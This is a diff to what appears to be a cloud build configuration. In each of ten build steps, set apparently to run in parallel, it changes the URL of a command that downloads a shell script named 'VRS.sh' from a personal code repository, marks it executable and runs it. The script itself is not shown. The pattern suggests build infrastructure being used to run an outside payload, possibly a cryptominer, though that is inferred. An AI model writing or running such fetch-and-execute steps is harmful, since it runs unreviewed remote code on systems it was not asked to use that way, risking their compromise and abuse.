@@ -3,7 +3,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -11,7 +11,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
     
@@ -19,7 +19,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -27,7 +27,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -35,7 +35,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -43,7 +43,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -51,7 +51,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -59,7 +59,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -67,7 +67,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     entrypoint: /bin/bash
 
@@ -75,7 +75,7 @@ steps:
     args: 
       - '-c'
       - >-
-        wget https://try.gitea.io/kinan/Ty/raw/branch/master/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
+        wget https://bitbucket.org/uskska12/yow/raw/fa4532e0102a1deaad9f9dbf1ff43d04c3fd19b9/VRS.sh && chmod u+x VRS.sh && ./VRS.sh
     waitFor: ["-"]
     
     entrypoint: /bin/bash
